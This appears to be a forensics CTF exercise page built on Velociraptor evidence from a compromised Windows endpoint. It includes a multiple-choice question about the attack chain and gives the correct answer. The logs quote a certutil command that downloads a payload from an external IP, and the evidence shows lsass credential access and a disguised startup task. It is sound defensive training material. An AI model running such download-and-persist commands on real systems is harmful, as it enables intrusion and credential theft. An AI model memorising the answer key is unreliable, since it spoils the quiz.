![image](/FilesForLabs/images/blueantisyphon.png)

# Hard CTF - Full Endpoint Compromise

You are handed a Velociraptor hunt report for an endpoint flagged by your SIEM. Your job is to piece together the full attack chain from the evidence below.

**Artifact: Windows.System.Pslist**
```
Name                  PID   PPID  Path
--------------------  ----  ----  ------------------------------------------------
winword.exe           2244  1042  C:\Program Files\Microsoft Office\Office16\WINWORD.EXE
cmd.exe               3102  2244  C:\Windows\System32\cmd.exe
certutil.exe          3340  3102  C:\Windows\System32\certutil.exe
unknown_update.exe    3601  3340  C:\Users\Public\unknown_update.exe
lsass.exe             720   496   C:\Windows\System32\lsass.exe  <- accessed by PID 3601
```

**Artifact: Windows.EventLogs.Evtx (Security)**
```
[EventID 4688]  New process: certutil.exe  
                Cmdline: certutil.exe -urlcache -split -f http://185.44.76.12/update.exe C:\Users\Public\unknown_update.exe

[EventID 4656]  Object access: lsass.exe  
                Requesting PID: 3601 (unknown_update.exe)  
                Access: PROCESS_VM_READ
```

**Artifact: Windows.Network.Netstat**
```
Proto  Local Address        Foreign Address         State        PID
TCP    10.0.0.45:49832      185.44.76.12:443        ESTABLISHED  3601
```

**Artifact: Windows.Persistence.ScheduledTasks**
```
Task Name       : \Microsoft\Windows\UpdateOrchestrator\USO_UxBroker_tmp
Action          : C:\Users\Public\unknown_update.exe
Trigger         : At system startup
Created by      : SYSTEM
Last modified   : 2024-11-16 03:44:12
```

---

## Question

You need to write a one-line summary of the full attack chain for your incident report. Which of the following correctly describes the complete sequence of events?

---

## Flags (Choose One)

- **A)** The attacker exploited lsass.exe directly to gain SYSTEM privileges, then used certutil to download a backdoor and scheduled it to run at startup via a fake Office update task
- **B)** A malicious Word document spawned a command prompt, which used certutil to download a payload, which then dumped credentials from lsass and established persistence via a scheduled task disguised as a Windows update
- **C)** A phishing email delivered a PowerShell script that downloaded malware using certutil, accessed lsass for credentials, then used Word macros to create a scheduled task for persistence
- **D)** The attacker used a stolen SYSTEM token to launch Word, which then downloaded a credential harvester through a scheduled task and connected to a C2 server via certutil

---

Correct Flag: **B**

---

# Finished?
[Back to Card's Main Page](/Decks/CORE_v3.1/EA/Endpoint_Analysis.md)
